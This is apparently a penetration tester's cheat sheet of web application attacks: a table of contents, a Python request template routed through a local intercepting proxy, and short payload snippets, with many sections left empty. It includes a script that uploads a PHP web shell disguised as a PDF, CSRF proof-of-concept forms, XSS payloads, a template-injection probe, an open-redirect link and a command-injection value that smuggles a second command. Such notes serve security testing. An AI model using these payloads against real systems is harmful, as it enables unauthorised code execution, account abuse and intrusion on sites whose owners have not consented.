# Web Application Security Attacks

* Application
	* Open Redirect
	* HTTP Parameter Pollution
	* Cross Site Request Forgery
	* HTML Injection
	* CRLF Injection
	* [XS-Search](#xssearch)
	* Cross Site Sripting
	* Template Injection
	* [IDOR](#idor)
	* [Type Confusion](#type)
	* [CORS Misconfiguration](#cors)
	* [Logic Bugs](#logic)
* Server
	* [Local/Remote File Inclusion](#lfi)
	* [SQL Injection](#sqli)
	* [Server Side Request Forgery](#ssrf)
	* [XML External Entity Vulnerability](#xxe)
	* [Insecure Deserialization](#deserialization)
	* [Prototype Pollution](#proto)
	* [ESI injection](#esi)
	* [Remote Code Execution](#rce)
* Cloud/Network
	* [Sub Domain Takeover](#sub)
	* [OAuth](#oauth)
	* [SAML](#saml)
	* [Parser Exploitation](#parser)
	* [AWS buckets](#aws)
	* [AppCache](#appcache)
	* [Cache Deception](#cached)
	* [Cache Poisoning](#cachep)
	* [Proxy Attacks](#proxy)
	* [HTTP Desync](#httpd)
* Multiple/Other
	* [XSS + CSRF](#xsscsrf)
	* [XSS + TRACE](#xsstrace)
	* [SSRF + CRLF](#ssrfcrlf)
	* [Jenkins](#jenkins)
* [Firewall Bypasses](#fire)
* [Flash](#flash)
* Spreadsheets
* Wordpress
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

<h2>Templates</h2>

<h3>Script template</h3>

	import requests
	from colorama import Fore, Back, Style

	requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

	proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

	def format_text(title, item):
		cr = '\r\n'
		section_break = cr + "*" * 20 + cr
		item = str(item)
		text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break
		return text

	r = requests.get('https://umich.com', verify=False, proxies=proxies)
	print format_text('r.status_code is: ', r.status_code)
	print format_text('r.headers is: ', r.headers)
	print format_text('r.cookies is: ', r.cookies)
	print format_text('r.text: ', r.text)


<h3>Post form data</h3>

	# Post form data
	proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
	multipart_form_data = {
	    'file': ('aloha.php', '<?php system($_GET[\'cmd\']); ?>', 'application/pdf'),
	    'submit' : (None, 'Send')
	}
	r = requests.post('http://127.0.0.2/contact.php', verify=False, proxies=proxies, files=multipart_form_data)

<h2 id="application">Application</h2>

<h3 id="open">Open Redirect</h3>

	http://evil.url

<b>Upgrade to Response Splitting</b>

<h3 id="csrf">Cross Site Request Forgery</h3>

	#GET example
	<html>
		<body>
			<script>history.pushState('', '', '/')</script>
				<form action="https://127.0.0.1/vulnerable/endpoint?param=value1&param2=value2" method="POST">
					<input type="submit" value="Submit request" />
				</form>
		</body>
	</html>

	#POST example
	<html>
		<body>
			<script>history.pushState('', '', '/')</script>
				<form action="https://127.0.0.1/vulnerable/endpoint" method="POST">
					<input type="hidden" name="param1" value="value1" />
					<input type="hidden" name="param2" value="value2" />
					<input type="submit" value="Submit request" />
				</form>
		</body>
	</html>

	#JSON example
	<html>
		<body>
			<script>history.pushState('', '', '/')</script>
				<form action="https://127.0.0.1/vulnerable/endpoint" method="POST">
					<input name='{"param1":"value1", "param2":"'value='"}'>
					<input type="submit" value="Submit request" />
				</form>
		</body>
	</html>



<b>Attacking local services</b>

<h3 id="xss">Cross Site Scripting</h3>

	<script>alert(1)</script>
	<svgonload=alert(1)>
	

<h3 id="ti">Template Injection</h3>

	input=%7B%7B7%2A7%7D%7D # {{7*7}}

<b>Sandbox Escape</b>

<h3 id="xxe">XML External Entities</h3>
	

<b>Local DTD files</b>

<h3 id="rce">Remote Code Execution</h3>

	input=%3Bdir

<b>Insecure API</b>
